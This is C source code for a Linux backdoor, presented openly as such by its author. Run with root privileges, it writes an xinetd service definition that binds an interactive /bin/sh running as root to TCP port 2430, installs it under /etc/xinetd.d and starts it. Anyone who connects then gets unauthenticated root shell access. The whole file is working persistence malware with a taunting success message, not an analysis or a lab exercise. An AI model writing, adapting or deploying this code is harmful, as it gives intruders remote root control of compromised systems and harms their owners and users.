/* Xinetd 'backdoor' // c0ded by pWr */

#include <stdio.h>
#include <stdlib.h>

int main()
{
	FILE *f_conf;
	
	f_conf = fopen("/etc/xinetd.conf", "r");
	
	printf("\nChecking for: /etc/xinetd.conf\n");
	
	if(f_conf != NULL)
		{
		printf("-> Check = OK\n");
		
		printf("Deleting previous tmp files\n");
		system("rm -rf /tmp/xinetd.tmp");
		
		printf("Echoing the backdoor to: /tmp/xinetd.tmp\n");
		system("echo service venus >> /tmp/xinetd.tmp");
		system("echo { >> /tmp/xinetd.tmp");
		system("echo disable = no >> /tmp/xinetd.tmp");
		system("echo protocol = tcp >> /tmp/xinetd.tmp");
		system("echo port = 2430 >> /tmp/xinetd.tmp");
		system("echo socket_type = stream >> /tmp/xinetd.tmp");
		system("echo wait = no >> /tmp/xinetd.tmp");
		system("echo user = root >> /tmp/xinetd.tmp");
		system("echo server = /bin/sh >> /tmp/xinetd.tmp");
		system("echo server_args = -i >> /tmp/xinetd.tmp");
		system("echo } >> /tmp/xinetd.tmp");
		
		printf("Moving the backdoor to: /etc/xinetd.d\n");
		system("mv -f /tmp/xinetd.tmp /etc/xinetd.d/venus");
		
		printf("Starting the backdoor on port: 2430\n");
		system("/usr/sbin/xinetd -d -f /etc/xinetd.d/venus");
		
		printf("j00 got it biznitch\n");
		}
	
	else if(f_conf == NULL)
		{
		printf("-> Check = FALSE\n");
		printf("\nthis backdoor will not work...!\n\n");
		}		
		
	return 0;
}
